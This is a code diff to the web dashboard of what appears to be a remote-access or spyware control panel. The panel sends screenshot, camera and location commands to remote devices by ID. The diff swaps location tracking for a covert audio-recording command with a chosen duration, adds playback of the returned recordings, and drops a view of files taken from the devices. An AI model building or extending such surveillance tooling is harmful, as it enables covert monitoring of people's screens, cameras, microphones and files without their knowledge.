@@ -90,7 +90,7 @@
                                 <div class="device-controls">
                                     <button onclick="sendCommand('${device.device_id}', 'capture_screenshot')">Capture Screenshot</button>
                                     <button onclick="sendCommand('${device.device_id}', 'capture_camera')">Capture Camera</button>
-                                    <button onclick="sendCommand('${device.device_id}', 'get_location')">Get Location</button>
+                                    <button onclick="sendAudioCommand('${device.device_id}', 'get_audio')">Record Audio</button>
                                 </div>
                             </div>
                         `;
@@ -180,7 +180,44 @@
                     alert('Error sending command. See console for details.');
                 });
         }
+        function sendAudioCommand(deviceId) {
+            const duration = prompt("Enter recording duration in seconds (default: 30):", "30");
+            if (duration === null) return; // User cancelled
 
+            const durationNum = parseInt(duration);
+            if (isNaN(durationNum) || durationNum <= 0) {
+                alert("Please enter a valid positive number for duration");
+                return;
+            }
+
+            const commandData = {
+                command: 'get_audio',
+                duration: durationNum
+            };
+
+            fetch('/command', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    device_id: deviceId,
+                    command: commandData
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    alert(`Audio recording command sent to device ${deviceId}`);
+                } else {
+                    alert(`Error sending command: ${data.message || 'Unknown error'}`);
+                }
+            })
+            .catch(error => {
+                console.error('Error sending command:', error);
+                alert('Error sending command. See console for details.');
+            });
+        }
         // Load command results for selected device
         function loadCommandResults() {
             const deviceId = document.getElementById('device-selector').value;
@@ -233,12 +270,13 @@
             else if (commandType === 'capture_camera' && resultData.image_data) {
                 return `<img src="data:image/jpeg;base64,${resultData.image_data}" style="max-width: 100%; max-height: 300px;" />`;
             }
-            else if (commandType === 'get_location' && resultData.latitude && resultData.longitude) {
-                const mapUrl = resultData.map_url || `https://maps.google.com/?q=${resultData.latitude},${resultData.longitude}`;
+            else if (commandType === 'get_audio' && resultData.audio_data) {
                 return `
-                    <p>Latitude: ${resultData.latitude}</p>
-                    <p>Longitude: ${resultData.longitude}</p>
-                    <p><a href="${mapUrl}" target="_blank" class="map-link">View on Map</a></p>
+                    <audio controls>
+                        <source src="data:audio/mp3;base64,${resultData.audio_data}" type="audio/mp3">
+                        Your browser does not support the audio element.
+                    </audio>
+                    <p>Duration: ${resultData.duration || 'unknown'} seconds</p>
                 `;
             } else {
                 return `<pre>${JSON.stringify(resultData, null, 2)}</pre>`;
@@ -383,19 +421,6 @@
                     }
                 }
             }
-
-            // Always include decoded files if they exist
-            if (itemData.decoded_files && !actualType.toLowerCase().includes('screenshot')) {
-                html += `<p><strong>Decoded Files:</strong></p>`;
-                for (const [fileName, content] of Object.entries(itemData.decoded_files)) {
-                    html += `
-                        <div style="margin-left: 20px; margin-bottom: 10px;">
-                            <p><strong>${fileName}</strong></p>
-                            <pre style="background: #f5f5f5; padding: 10px; border-radius: 4px;">${content}</pre>
-                        </div>`;
-                }
-            }
-
             // Always include raw data
             html += `<details>
                         <summary>View Raw Data</summary>
